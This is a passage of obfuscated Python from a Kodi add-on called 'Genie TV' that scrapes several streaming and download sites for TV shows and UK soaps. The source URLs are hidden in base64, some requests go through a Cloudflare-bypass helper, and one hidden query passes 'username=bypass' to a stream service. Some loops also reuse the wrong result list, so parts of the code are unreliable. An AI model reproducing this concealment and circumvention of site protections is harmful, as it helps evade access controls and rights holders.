    oo00O00oO ( ( '[COLORgreen]' + oO00oooOOoOo0 + '- source Herovision[/COLOR]' ) , ooooO0oOoOOoO , 222 , OOOO0OOO , I1iI11iii , o0OoOO )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 70 , "" , "Getting Herovision Links" )
    if 13 - 13: iI1Ii11iII1 * ii11ii1ii / ii11ii1ii / iIii1I11I1II1 % iIii1I11I1II1
    i1IIIiiII1 ( 'tvshows' , 'Media Info 3' )
    if 21 - 21: ii11ii1ii
 if O000oooOO0Oo0 != 'Failed' :
  oOOOO0oo0O0OO = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( O000oooOO0Oo0 )
  for ooooO0oOoOOoO , OOOO0OOO , oO00oooOOoOo0 in oOOOO0oo0O0OO :
   if iiI11iI in oO00oooOOoOo0 . lower ( ) :
    oo0o0000Oo0 ( ( '[COLORgreen]' + oO00oooOOoOo0 + '- source Silent Hunter[/COLOR]' ) , ooooO0oOoOOoO , 222 , OOOO0OOO )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 78 , "" , "Getting Silent Hunter Links" )
    if 58 - 58: oOO - OOooOOo + O0 / i1IIi % OoooooooOO
    i1IIIiiII1 ( 'tvshows' , 'Media Info 3' )
 IIiIiIiiI1Iii = [ '480p' , '720p' , '1080p' , 'mova' , 'movb' , 'movc' , 'movd' , 'move' , 'movf' , 'movg' , 'movh' , 'movi' , 'movj' , 'movk' , 'movl' , 'movm' , 'movn' , 'movo' , 'movp' , 'movq' , 'movr' , 'movs' , 'movt' , 'movu' , 'movv' , 'movw' , 'movx' , 'movy' , 'movz' ]
 if 43 - 43: O0 - oOO % OoooooooOO % i11i1 + II1i1IiiIIi11
 for oO0Ooo0OooOOo in IIiIiIiiI1Iii :
  O00o0O = IIiiiiiiIi1I1 + oO0Ooo0OooOOo + II11iiii1Ii
  o0OIi = I1ii1Ii1 ( O00o0O )
  if o0OIi != 'Failed' :
   IIi1iiI = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( o0OIi )
   for ooooO0oOoOOoO , OOOO0OOO , o0OoOO , I1iI11iii , oO00oooOOoOo0 in IIi1iiI :
    if iiI11iI in oO00oooOOoOo0 . lower ( ) :
     oo00O00oO ( '[COLORgreen]' + oO00oooOOoOo0 + ' - Source Pandoras[/COLOR]' , ooooO0oOoOOoO , 222 , OOOO0OOO , I1iI11iii , o0OoOO )
     Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
     Oo0oO0ooo . update ( 89 , "" , "Getting Pandoras Links" )
     if 97 - 97: I1I1ii . OOoo0OO0 / OOOo0
     i1IIIiiII1 ( 'tvshows' , 'Media Info 3' )
     if 83 - 83: OOoo0OO0 - ii11ii1ii * Ooo0OO0oOO
 ii111Iiii = [ '0-9/' , 'A/' , 'B/' , 'C/' , 'D/' , 'E/' , 'F/' , 'G/' , 'H/' , 'I/' , 'J/' , 'K/' , 'L/' , 'M/' , 'N/' , 'O/' , 'P/' , 'R/' , 'S/' , 'T/' , 'U/' , 'V/' , 'W/' , 'X/' , 'Y/' , 'Z/' ]
 if 90 - 90: Oo * OOOo0
 if 75 - 75: ii11ii1ii - I1IiI * i11iIiiIii . OoooooooOO - Oo . OOoo0OO0
 for oO0Ooo0OooOOo in ii111Iiii :
  O00o0O = OoO000Oo0oO + oO0Ooo0OooOOo
  I1iI1i11IiI11 = ii111iiIii ( O00o0O )
  if o0oOoO00 != 'Failed' :
   o0Oooo00oo0O = re . compile ( '<li><a href="(.+?)"> (.+?)</a></li>' ) . findall ( I1iI1i11IiI11 )
   for o00ooO0ooO0o0 , oO00oooOOoOo0 in o0Oooo00oo0O :
    if iiI11iI in oO00oooOOoOo0 . lower ( ) :
     I1i1iii1Ii ( ( '[COLORgreen]' + oO00oooOOoOo0 + 'source 5[/COLOR]' ) . replace ( 'Ganool' , '' ) . replace ( 'ShAaNiG' , '' ) . replace ( 'YIFY' , '' ) . replace ( '[[ Max-Movie.In ]]' , '' ) . replace ( '.mkv' , '' ) . replace ( '.mp4' , '' ) . replace ( '.' , ' ' ) , ( OoO000Oo0oO + oO0Ooo0OooOOo + o00ooO0ooO0o0 ) , 222 , '' )
     Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
     Oo0oO0ooo . update ( 100 , "" , "Getting Source 5 Links" )
     if 50 - 50: Ooo00oOo00o * OOoo0OO0 - OOooOOo + iI1Ii11iII1 * Ooo00oOo00o % Ooo0OO0oOO
     i1IIIiiII1 ( 'tvshows' , 'Media Info 3' )
     if 92 - 92: OOoo0OO0 % i1IIi % oOO % iI1Ii11iII1 % OOooOOo
     if 61 - 61: i11i1 * OOooOOo * O0 / II1i1IiiIIi11
def OOOo0oO ( ) :
 if 77 - 77: OoOoOO00
 iiI11iI = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 o0Oo0oO0oOO00 = iiI11iI . lower ( )
 OOO0OoO0oo0OO = ( i1111 ( 'aHR0cDovL2Nvb2x0dnNlcmllcy5jb20vc2VhcmNoLnBocD90YWc9' ) ) + ( iiI11iI ) . replace ( ' ' , '+' )
 ooooO0oOoOOoO = ( i1111 ( 'aHR0cDovL2RsLmZhcnNpbW92aWUubmV0L1NlcmlhbC8=' ) )
 I1III1111iIi = ( i1111 ( 'aHR0cDovL3N2Mi5kbC1wYXJzLmluLw==' ) )
 OooOo0oo0O0o00O = ( i1111 ( 'aHR0cDovL3R2LmRsLXBhcnMuaW4v' ) )
 iIii1I1iII = ( i1111 ( 'aHR0cDovL2RsLnZpcG1heC1tb3ZpZS5pbi9BbWVyaWNhbiUyMFNlcmlhbC8=' ) )
 i1I111II = ( i1111 ( 'aHR0cDovL2RpemlsYWIuY29tL2Fyc2l2P2xpbWl0PSZ0dXI9Jm9yZGVyYnk9JnVsa2U9Jm9yZGVyPSZ5aWw9JmRpemlfYWRpPQ==' ) ) + ( iiI11iI ) . replace ( ' ' , '+' )
 Oo0OOo = ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9zY29vYnkvc2hvd3MvdHZhbGwucGhw' ) )
 i1II11I11ii1 = ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9UaGVfUmVhcGVyL2FsbHR2LnBocA==' ) )
 OOoO0oO00o = ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9oZXJvdmlzaW9uL3ZvZC90dmZ1bGwucGhw' ) )
 if 49 - 49: OOOo0 - i11iIiiIii + iI1Ii11iII1
 Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Checking Sources" , '' , 'Please Wait' )
 OoO0o00OOOOO = ii111iiIii ( OOO0OoO0oo0OO )
 Oo0oO0ooo . update ( 0 , "" , "Checking Source 1/9 Links" )
 Oo0oO00o = ii111iiIii ( ooooO0oOoOOoO )
 Oo0oO0ooo . update ( 14 , "" , "Checking Source 2/9 Links" )
 oOIIiIi = ii111iiIii ( I1III1111iIi )
 Oo0oO0ooo . update ( 28 , "" , "Checking Source 3/9 Links" )
 I1iiIiIII = ii111iiIii ( OooOo0oo0O0o00O )
 Oo0oO0ooo . update ( 40 , "" , "Checking Source 4/9 Links" )
 iIi = ii111iiIii ( iIii1I1iII )
 Oo0oO0ooo . update ( 52 , "" , "Checking Source 5/9 Links" )
 o0oOoO00 = cloudflare . source ( i1I111II )
 Oo0oO0ooo . update ( 64 , "" , "Checking Source 6/9 Links" )
 I1iI1i11IiI11 = ii111iiIii ( Oo0OOo )
 Oo0oO0ooo . update ( 76 , "" , "Checking Source 7/9 Links" )
 oOO000 = ii111iiIii ( i1II11I11ii1 )
 Oo0oO0ooo . update ( 88 , "" , "Checking Source 8/9 Links" )
 OoOooO = ii111iiIii ( OOoO0oO00o )
 Oo0oO0ooo . update ( 100 , "" , "Checking Source 9/9 Links" )
 if 52 - 52: iIii1I11I1II1
 if OoOooO != 'Failed' :
  Ii1IOOooO00OO = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( OoOooO )
  for ooooO0oOoOOoO , OOOO0OOO , o0OoOO , I1iI11iii , oO00oooOOoOo0 in Ii1IOOooO00OO :
   if iiI11iI in oO00oooOOoOo0 . lower ( ) :
    iIiIIIi ( ( '[COLORgreen]' + oO00oooOOoOo0 + '- source HeroVision[/COLOR]' ) , ooooO0oOoOOoO , 1016 , OOOO0OOO , I1iI11iii , o0OoOO )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 10 , "" , "Getting Herovision Links" )
    if 49 - 49: i11i1
    i1IIIiiII1 ( 'tvshows' , 'Media Info 3' )
    if 23 - 23: Ooo00oOo00o / II1i1IiiIIi11 / iIii1I11I1II1
 if oOO000 != 'Failed' :
  i11i = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( oOO000 )
  for ooooO0oOoOOoO , OOOO0OOO , o0OoOO , I1iI11iii , oO00oooOOoOo0 in i11i :
   if iiI11iI in oO00oooOOoOo0 . lower ( ) :
    iIiIIIi ( ( '[COLORgreen]' + oO00oooOOoOo0 + '- source Reaper[/COLOR]' ) , ooooO0oOoOOoO , 1016 , OOOO0OOO , I1iI11iii , o0OoOO )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 20 , "" , "Getting Reaper Links" )
    if 44 - 44: Oo . Oo + OoooooooOO * i11iIiiIii / OOoo0OO0 + I1I1ii
    i1IIIiiII1 ( 'tvshows' , 'Media Info 3' )
    if 17 - 17: i11i1 + OoOoOO00
 if OoO0o00OOOOO != 'Failed' :
  IiIIi11i = re . compile ( 'href="([^"]*)"><img src="([^"]*)" alt="([^"]*)"' ) . findall ( OoO0o00OOOOO )
  for ooooO0oOoOOoO , IIIIiI11I11 , oO00oooOOoOo0 in IiIIi11i :
   if iiI11iI in oO00oooOOoOo0 . lower ( ) :
    oo0o0000Oo0 ( '[COLORgreen]' + oO00oooOOoOo0 + ' CoolSeries[/COLOR]' , ooooO0oOoOOoO , 7052 , IIIIiI11I11 )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 30 , "" , "Getting CoolSeries Links" )
    if 43 - 43: OOoo0OO0 % oO0O / OOooOOo * I1I1ii
    i1IIIiiII1 ( 'tvshows' , 'Media Info 3' )
 if Oo0oO00o != 'Failed' :
  IiI11iII1 = re . compile ( '<a .*?>(.*?)</a>' ) . findall ( Oo0oO00o )
  for oO00oooOOoOo0 in IiI11iII1 :
   if iiI11iI in oO00oooOOoOo0 . lower ( ) :
    oo0o0000Oo0 ( '[COLORgreen]' + ( oO00oooOOoOo0 ) . replace ( '..&gt;' , '' ) . replace ( '/' , '' ) + ' source 1 [/COLOR]' , ( ooooO0oOoOOoO + oO00oooOOoOo0 ) . replace ( ' ' , '%20' ) , 1006 , '' )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 40 , "" , "Getting Source 1 Links" )
    if 85 - 85: iIii1I11I1II1 . OoooooooOO . OOooOOo
    i1IIIiiII1 ( 'tvshows' , 'Media Info 3' )
 if oOIIiIi != 'Failed' :
  IIII11I1I = re . compile ( '<a .*?>(.*?)</a>' ) . findall ( oOIIiIi )
  for oO00oooOOoOo0 in IIII11I1I :
   if iiI11iI in oO00oooOOoOo0 . lower ( ) :
    oo0o0000Oo0 ( ( oO00oooOOoOo0 + ' source 2' ) . replace ( '..&gt;' , '' ) . replace ( '/' , '' ) , ( I1III1111iIi + oO00oooOOoOo0 ) . replace ( ' ' , '%20' ) , 1006 , '' )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 50 , "" , "Getting Source 2 Links" )
    if 77 - 77: OOOo0 % oOO
    i1IIIiiII1 ( 'tvshows' , 'Media Info 3' )
 if I1iiIiIII != 'Failed' :
  I1i1ii1IiIii = re . compile ( '<a .*?>(.*?)</a>' ) . findall ( I1iiIiIII )
  for oO00oooOOoOo0 in IIII11I1I :
   if iiI11iI in oO00oooOOoOo0 . lower ( ) :
    oo0o0000Oo0 ( ( oO00oooOOoOo0 + ' source 3' ) . replace ( '..&gt;' , '' ) . replace ( '/' , '' ) , ( OooOo0oo0O0o00O + oO00oooOOoOo0 ) . replace ( ' ' , '%20' ) , 1006 , '' )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 60 , "" , "Getting Source 3 Links" )
    if 74 - 74: I1IiI / i1IIi % OoooooooOO
    i1IIIiiII1 ( 'tvshows' , 'Media Info 3' )
 if iIi != 'Failed' :
  o00o0o000Oo = re . compile ( '<a .*?>(.*?)</a>' ) . findall ( iIi )
  for oO00oooOOoOo0 in IIII11I1I :
   if iiI11iI in oO00oooOOoOo0 . lower ( ) :
    oo0o0000Oo0 ( ( oO00oooOOoOo0 + ' source 4' ) . replace ( '..&gt;' , '' ) . replace ( '/' , '' ) , ( iIii1I1iII + oO00oooOOoOo0 ) . replace ( ' ' , '%20' ) , 1006 , '' )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 70 , "" , "Getting Source 4 Links" )
    if 100 - 100: i1IIi - i11iIiiIii . I1I1ii * Ooo00oOo00o
    i1IIIiiII1 ( 'tvshows' , 'Media Info 3' )
 if o0oOoO00 != 'Failed' :
  I111Iii1 = re . compile ( '<a href="(.+?)" class="film-image">\n<img src="(.+?)" alt=""/>\n</a>\n<div class="tss-detail">\n<a class="title" style="" href=".+?">\n<span class="position">.+?</span>\n(.+?)</a>' ) . findall ( o0oOoO00 )
  for ooooO0oOoOOoO , IIIIiI11I11 , oO00oooOOoOo0 in I111Iii1 :
   if iiI11iI in oO00oooOOoOo0 . lower ( ) :
    oo0o0000Oo0 ( '[COLORgreen]' + oO00oooOOoOo0 + ' - Source - Dizi[/COLOR]' , ooooO0oOoOOoO , 8062 , IIIIiI11I11 )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 80 , "" , "Getting Dizi Links" )
    if 62 - 62: O0
    i1IIIiiII1 ( 'tvshows' , 'Media Info 3' )
 if I1iI1i11IiI11 != 'Failed' :
  o0Oooo00oo0O = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( I1iI1i11IiI11 )
  for ooooO0oOoOOoO , OOOO0OOO , o0OoOO , I1iI11iii , oO00oooOOoOo0 in o0Oooo00oo0O :
   if iiI11iI in oO00oooOOoOo0 . lower ( ) :
    iIiIIIi ( ( '[COLORgreen]' + oO00oooOOoOo0 + '- Source Scooby[/COLOR]' ) , ooooO0oOoOOoO , 1016 , OOOO0OOO , I1iI11iii , o0OoOO )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 90 , "" , "Getting Scooby Links" )
    if 41 - 41: i1IIi - OOOo0
    i1IIIiiII1 ( 'tvshows' , 'Media Info 3' )
    if 48 - 48: OOOo0 - OoOoOO00 / Ooo00oOo00o + OOOo0
 i1iii1IiiiI1i1 = [ 'a' , 'b' , 'c' , 'd' , 'e' , 'f' , 'g' , 'h' , 'i' , 'j' , 'k' , 'l' , 'm' , 'n' , 'o' , 'p' , 'q' , 'r' , 's' , 't' , 'u' , 'v' , 'w' , 'x' , 'y' , 'z' ]
 if 37 - 37: Oo - i1IIi - iI1Ii11iII1 + OOoo0OO0 . iIii1I11I1II1
 for oO0Ooo0OooOOo in i1iii1IiiiI1i1 :
  O00o0O = IIiiiiiiIi1I1 + oO0Ooo0OooOOo + II11iiii1Ii
  I1iIi1iIIIIiI = I1ii1Ii1 ( O00o0O )
  if I1iIi1iIIIIiI != 'Failed' :
   oO0OOO00 = re . compile ( '<item>.+?<title>(.+?)</title>.+?<description>(.+?)</description>.+?<link>(.+?)</link>.+?<thumbnail>(.+?)</thumbnail>.+?<fanart>(.+?)</fanart>.+?<mode>(.+?)</mode>.+?</item>' , re . DOTALL ) . findall ( I1iIi1iIIIIiI )
   for oO00oooOOoOo0 , o0OoOO , ooooO0oOoOOoO , IIIIiI11I11 , i1i1ii , OOoOoo00Oo in oO0OOO00 :
    if iiI11iI in oO00oooOOoOo0 . lower ( ) :
     iIiIIIi ( '[COLORgreen]' + oO00oooOOoOo0 + ' - Source Pandoras[/COLOR]' , ooooO0oOoOOoO , OOoOoo00Oo , IIIIiI11I11 , i1i1ii , o0OoOO )
     Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
     Oo0oO0ooo . update ( 100 , "" , "Getting Pandoras Links" )
     if 59 - 59: OoooooooOO - I1I1ii % OOooOOo . OOoo0OO0 + i1IIi * OOoo0OO0
     i1IIIiiII1 ( 'tvshows' , 'Media Info 3' )
     if 5 - 5: OoOoOO00 - iI1Ii11iII1
     if 86 - 86: iI1Ii11iII1 * OOoo0OO0 + O0 * I1I1ii + i11iIiiIii - ii11ii1ii
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
def oOOO000o0O0O ( ) :
 if 28 - 28: i1IIi . i11i1
 iiI11iI = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 o0Oo0oO0oOO00 = iiI11iI . lower ( )
 ooooO0oOoOOoO = ( i1111 ( 'aHR0cDovL3VrdHZub3cuZGVzaXN0cmVhbXMudHYvRGVzaVN0cmVhbXMvaW5kZXgyMDIucGhwP3RhZz1nZXRfYWxsX2NoYW5uZWwmdXNlcm5hbWU9YnlwYXNz' ) )
 Oo0oO00o = I1ii1Ii1 ( ooooO0oOoOOoO )
 IiI11iII1 = re . compile ( '"id":".+?","name":"(.+?)","img":"(.+?)","stream_url3":".+?","cat_id":"(.+?)","stream_url2":".+?","stream_url":".+?"}' , re . DOTALL ) . findall ( Oo0oO00o )
 for oO00oooOOoOo0 , IIIIiI11I11 , O0Ooo0O in IiI11iII1 :
  iii1oOo0OoOOOo0 = i1111 ( 'aHR0cDovL3VrdHZub3cuZGVzaXN0cmVhbXMudHYv' ) + ( IIIIiI11I11 ) . replace ( '\\' , '' )
  if iiI11iI in oO00oooOOoOo0 . lower ( ) :
   oo0o0000Oo0 ( oO00oooOOoOo0 , '' , 7022 , iii1oOo0OoOOOo0 )
   if 55 - 55: Ooo0OO0oOO + O0 / II1i1IiiIIi11 % oOO / OoooooooOO
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
O00o0OO0OO0oo = '{ZH},' ; Ooo0O0ooo0o = '{IX},' ; IiiiIIiii = '{LM},'
if 91 - 91: OOooOOo . II1i1IiiIIi11 % Oo - II1i1IiiIIi11 . Ooo0OO0oOO % i11iIiiIii
def iIiO0O ( url ) :
 oOOoooo = cloudflare . source ( url )
 IiI11iII1 = re . compile ( '<a class="season" href="(.+?)">\n(.+?)\n</a>\n</span>\n<span>\n<a class="episode" href=".+?">\n(.+?)\n</a>\n</span>\n<span>\n<a class="episode-name" href=".+?">\n(.+?)</a>' ) . findall ( oOOoooo )
 for url , iIi11io0o00o0Oo , OoOOoOooooOOo , oO00oooOOoOo0 in IiI11iII1 :
  oo0o0000Oo0 ( ( iIi11io0o00o0Oo ) . replace ( 'Sezon' , ' Season ' ) + ( OoOOoOooooOOo ) . replace ( 'Bölüm' , ' Episode ' ) + oO00oooOOoOo0 , url , 8063 , '' )
  if 70 - 70: II1i1IiiIIi11 . OoOoOO00 . II1i1IiiIIi11 - iIii1I11I1II1
  if 92 - 92: Ooo00oOo00o
  if 15 - 15: iI1Ii11iII1 / iI1Ii11iII1 + iIii1I11I1II1 % OoooooooOO
  if 12 - 12: oOO
def I11OOO0 ( url ) :
 oOOoooo = cloudflare . source ( url )
 IiI11iII1 = re . compile ( 'file: "(.+?)",.+?label: "(.+?)",' , re . DOTALL ) . findall ( oOOoooo )
 for url , oO00oooOOoOo0 in IiI11iII1 :
  I1i1iii1Ii ( oO00oooOOoOo0 , url , 222 , '' )
  if 16 - 16: II1i1IiiIIi11 / iIii1I11I1II1 + i11i1 * II1i1IiiIIi11 * OOoo0OO0
  if 8 - 8: I1I1ii
  if 15 - 15: Oo / oO0O % O0 + ii11ii1ii
  if 96 - 96: oOO . OoooooooOO
def i1I1I1I ( ) :
 if 25 - 25: OOooOOo + II1i1IiiIIi11 - Oo
 oOOoooo = cloudflare . source ( i1111 ( 'aHR0cDovL2RpemlsYWIuY29t' ) )
 IiI11iII1 = re . compile ( '<li id=".+?">.+?<a href="(.+?)">.+?<img width="40" height="40" src="(.+?)" alt=""/>.+?<span class="title">\n(.+?)</span>.+?<span class="alt-title">\n(.+?)</span>.+?</a>.+?</li>' , re . DOTALL ) . findall ( oOOoooo )
 for ooooO0oOoOOoO , IIIIiI11I11 , oO00oooOOoOo0 , OoOOoOooooOOo in IiI11iII1 :
  oo0o0000Oo0 ( oO00oooOOoOo0 + '  -  ' + ( OoOOoOooooOOo ) . replace ( 'sezon' , 'Season' ) . replace ( 'bölüm' , 'Episode' ) , ooooO0oOoOOoO , 8063 , IIIIiI11I11 )
  if 59 - 59: i11i1 - OOoo0OO0 % i1IIi
def IIOO ( ) :
 IIi1IIIi = O00Ooo ( i1111 ( 'aHR0cDovL3d3dy50dmd1aWRlLmNvLnVrLw==' ) )
 IiI11iII1 = re . compile ( '<a href="(.+?)"  qt-title=".+?" qt-text=".+?<br> .+?" title="(.+?)".+?class=".+? src="(.+?)" alt=".+?" /></a>' , re . DOTALL ) . findall ( IIi1IIIi )
 for ooooO0oOoOOoO , oO00oooOOoOo0 , IIIIiI11I11 in IiI11iII1 :
  I1i1iii1Ii ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , ooooO0oOoOOoO , 8002 , IIIIiI11I11 )
def Ooo000o0oo0 ( url ) :
 IIi1IIIi = O00Ooo ( url )
 IiI11iII1 = re . compile ( '<table border="0".+?url((.+?));background-repeat: no-repeat;">.+?<tr>.+?<span class="season">(.+?)</span><br>.+?<a href="(.+?)"+?>(.+?)</span><br>.+?<span class="programmetext">(.+?)</span></a><br>' , re . DOTALL ) . findall ( IIi1IIIi )
 for IIIIiI11I11 , time , url , oO00oooOOoOo0 , Ii1I in IiI11iII1 :
  iIiIIIi ( '%s %s' % ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , time ) , url , 1015 , IIIIiI11I11 , Ii1I )
  if 71 - 71: oOO . OOoo0OO0 + i11i1
def IiIiiI1ii111 ( ) :
 if 30 - 30: oO0O + OoOoOO00 % OoooooooOO
 oo0o0000Oo0 ( 'Coronation Street' , '' , 8001 , '' )
 oo0o0000Oo0 ( 'Eastenders' , '' , 8002 , '' )
 oo0o0000Oo0 ( 'Emmerdale' , '' , 8003 , '' )
 oo0o0000Oo0 ( 'Hollyoaks' , '' , 8004 , '' )
 oo0o0000Oo0 ( 'Im a Celebrity' , '' , 8005 , '' )
 if 89 - 89: oO0O
 if 51 - 51: II1i1IiiIIi11
 if 68 - 68: II1i1IiiIIi11 - OOooOOo * Ooo00oOo00o % oOO . oOO - iIii1I11I1II1
 if 22 - 22: OoooooooOO / ii11ii1ii % II1i1IiiIIi11 * I1IiI
def Ii1IiiiI1ii ( ) :
 Oo0oO00o = I1ii1Ii1 ( 'http://uksoapshare.blogspot.co.uk/' )
 IiI11iII1 = re . compile ( '<a href="(.+?)".+?target=_blank>(.+?)</a>' ) . findall ( Oo0oO00o )
 for ooooO0oOoOOoO , oO00oooOOoOo0 in IiI11iII1 :
  if 'Holly' in oO00oooOOoOo0 :
   IIIIiI11I11 = 'http://2.bp.blogspot.com/-9c7Sieh1RKs/UjD6TGAEEnI/AAAAAAAAAC8/84uwHfxcuYg/s1600/Hollyoaks.png'
   if 'huge' in ooooO0oOoOOoO :
    I1i1iii1Ii ( ( oO00oooOOoOo0 ) . replace ( '.HDTV.x264-SS.mp4' , '' ) . replace ( '_HDTV.x264' , '' ) . replace ( '-SS.mp4' , '' ) . replace ( '_720p.HDTV.x264.' , ' ' ) . replace ( '_720p' , '' ) , ooooO0oOoOOoO . replace ( '\\/' , '/' ) , 8006 , IIIIiI11I11 )
   else :
    pass
    if 55 - 55: ii11ii1ii
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE_IGNORE_THE ) ;
 if 76 - 76: Ooo0OO0oOO - i11iIiiIii
def II1ii1iI ( ) :
 Oo0oO00o = I1ii1Ii1 ( 'http://uksoapshare.blogspot.co.uk/' )
 IiI11iII1 = re . compile ( '<a href="(.+?)".+?target=_blank>(.+?)</a>' ) . findall ( Oo0oO00o )
 for ooooO0oOoOOoO , oO00oooOOoOo0 in IiI11iII1 :
  if 'East' in oO00oooOOoOo0 :
   IIIIiI11I11 = 'http://3.bp.blogspot.com/-KWHcNbNJU8Y/Vi1ousRl7fI/AAAAAAAAAT8/ksNE12LH0nE/s1600/eastenders.jpg'
   if 'huge' in ooooO0oOoOOoO :
    I1i1iii1Ii ( ( oO00oooOOoOo0 ) . replace ( '.HDTV.x264-SS.mp4' , '' ) . replace ( '_HDTV.x264' , '' ) . replace ( '-SS.mp4' , '' ) . replace ( '_720p.HDTV.x264.' , ' ' ) . replace ( '_720p' , '' ) , ooooO0oOoOOoO . replace ( '\\/' , '/' ) , 8006 , IIIIiI11I11 )
   else :
    pass
    if 29 - 29: oO0O / oOO % OOoo0OO0
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 10 - 10: iIii1I11I1II1 % OoooooooOO % ii11ii1ii
def IiiI1i111I1i ( ) :
 Oo0oO00o = I1ii1Ii1 ( 'http://uksoapshare.blogspot.co.uk/' )
 IiI11iII1 = re . compile ( '<a href="(.+?)".+?target=_blank>(.+?)</a>' ) . findall ( Oo0oO00o )
 for ooooO0oOoOOoO , oO00oooOOoOo0 in IiI11iII1 :
  if 'Emmer' in oO00oooOOoOo0 :
   IIIIiI11I11 = 'http://2.bp.blogspot.com/-UfDcxisVV5c/UjH9vUicZ3I/AAAAAAAAADc/8Ozuiz1ojxw/s1600/Emmerdale.jpg'
   if 'huge' in ooooO0oOoOOoO :
    I1i1iii1Ii ( ( oO00oooOOoOo0 ) . replace ( '.HDTV.x264-SS.mp4' , '' ) . replace ( '_HDTV.x264' , '' ) . replace ( '-SS.mp4' , '' ) . replace ( '_720p.HDTV.x264.' , ' ' ) . replace ( '_720p' , '' ) , ooooO0oOoOOoO . replace ( '\\/' , '/' ) , 8006 , IIIIiI11I11 )
   else :
    pass
    if 97 - 97: i11i1 % OOOo0 * OOOo0 % Oo
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 86 - 86: oO0O * i1IIi + Ooo0OO0oOO
def iI1i1I11i ( ) :
 Oo0oO00o = I1ii1Ii1 ( 'http://uksoapshare.blogspot.co.uk/' )
 IiI11iII1 = re . compile ( '<a href="(.+?)".+?target=_blank>(.+?)</a>' ) . findall ( Oo0oO00o )
 for ooooO0oOoOOoO , oO00oooOOoOo0 in IiI11iII1 :
  if 'Coro' in oO00oooOOoOo0 :
   IIIIiI11I11 = 'http://3.bp.blogspot.com/-hofvfBQVexs/UjErIfNdS4I/AAAAAAAAADQ/Q-vVGu3apYU/s1600/corrie.jpg'
   if 'huge' in ooooO0oOoOOoO :
    I1i1iii1Ii ( ( oO00oooOOoOo0 ) . replace ( '.HDTV.x264-SS.mp4' , '' ) . replace ( '_HDTV.x264' , '' ) . replace ( '-SS.mp4' , '' ) . replace ( '_720p.HDTV.x264.' , ' ' ) . replace ( '_720p' , '' ) , ooooO0oOoOOoO . replace ( '\\/' , '/' ) , 8006 , IIIIiI11I11 )
   else :
    pass
    if 10 - 10: OoooooooOO * OoOoOO00
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 37 - 37: OoooooooOO
def oo0OooO ( ) :
 Oo0oO00o = I1ii1Ii1 ( 'http://uksoapshare.blogspot.co.uk/' )
 IiI11iII1 = re . compile ( '<a href="(.+?)" target="_blank">(.+?)</a>' ) . findall ( Oo0oO00o )
 for ooooO0oOoOOoO , oO00oooOOoOo0 in IiI11iII1 :
  if 'Celeb' in oO00oooOOoOo0 :
